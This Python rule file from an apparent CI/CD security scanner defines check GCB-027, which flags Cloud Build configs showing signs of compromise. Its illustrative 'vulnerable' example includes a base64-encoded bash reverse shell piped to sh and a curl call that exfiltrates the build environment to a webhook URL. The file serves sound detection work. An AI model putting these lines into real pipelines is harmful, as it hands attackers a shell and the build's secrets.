"""GCB-027, Cloud Build config contains evidence of malicious activity."""
from __future__ import annotations

from ..._malicious import find_malicious_patterns, summarize_malicious_hits
from ..._primitives.blob_rule import yaml_blob_check
from ...base import Severity
from ...rule import Rule

RULE = Rule(
    id="GCB-027",
    title="Config contains indicators of malicious activity",
    severity=Severity.CRITICAL,
    owasp=("CICD-SEC-4", "CICD-SEC-7"),
    esf=("ESF-D-INJECTION", "ESF-S-VERIFY-DEPS"),
    cwe=("CWE-506", "CWE-913"),
    recommendation=(
        "Treat as a potential compromise. Identify the change that "
        "added the matching step(s), rotate any Secret Manager secrets "
        "the build can reach, and audit recent builds in Cloud Build "
        "history."
    ),
    docs_note=(
        "Specific indicators only (reverse shells, base64-decoded "
        "execution, miner binaries, Discord/Telegram webhooks, "
        "credential-dump pipes, audit-erasure commands). Does not "
        "replace GCB-011 (TLS bypass) or GCB-013 (Docker insecure), "
        "those are hygiene; this is evidence. The Cloud Build analog of "
        "GHA-027 / GL-025 / BB-025 / ADO-026 / CC-026."
    ),
    known_fp=(
        "Security-training repositories, CTF challenges, and red-team "
        "exercise pipelines legitimately contain reverse-shell strings "
        "or exfil domains as literals. Matches inside YAML keys whose "
        "names contain ``example``, ``fixture``, ``sample``, ``demo``, "
        "or ``test`` are auto-suppressed; bare lines in a production "
        "build still fire.",
        "Defaults to LOW confidence. Filter with ``--min-confidence "
        "MEDIUM`` to ignore all matches; the rule still surfaces the "
        "hit for teams that want to spot-check.",
    ),
    exploit_example=(
        "# Vulnerable: a step decodes and executes a base64 payload\n"
        "# and exfils the build environment to a third-party webhook.\n"
        "# A malicious change (or a compromised builder image) lands\n"
        "# the payload; every subsequent build executes it with the\n"
        "# build's service-account identity.\n"
        "steps:\n"
        "  - name: gcr.io/cloud-builders/bash\n"
        "    args:\n"
        "      - -c\n"
        "      - echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | sh\n"
        "  - name: gcr.io/cloud-builders/curl\n"
        "    args: ['https://webhook.site/abc?env=$(env|base64)']\n"
        "\n"
        "# Safe: the build does only what the build does. No obfuscated\n"
        "# execution, no exfil POSTs, no base64 -d | sh pipelines. If a\n"
        "# check fires it's a compromise or a CTF fixture; treat as\n"
        "# incident response.\n"
        "steps:\n"
        "  - name: gcr.io/cloud-builders/docker\n"
        "    args: ['build', '-t', 'gcr.io/$PROJECT_ID/app', '.']"
    ),
)


check = yaml_blob_check(
    RULE,
    scanner=find_malicious_patterns,
    pass_desc="No indicators of malicious activity detected.",
    fail_desc=summarize_malicious_hits,
    pass_recommendation="No action required.",
)
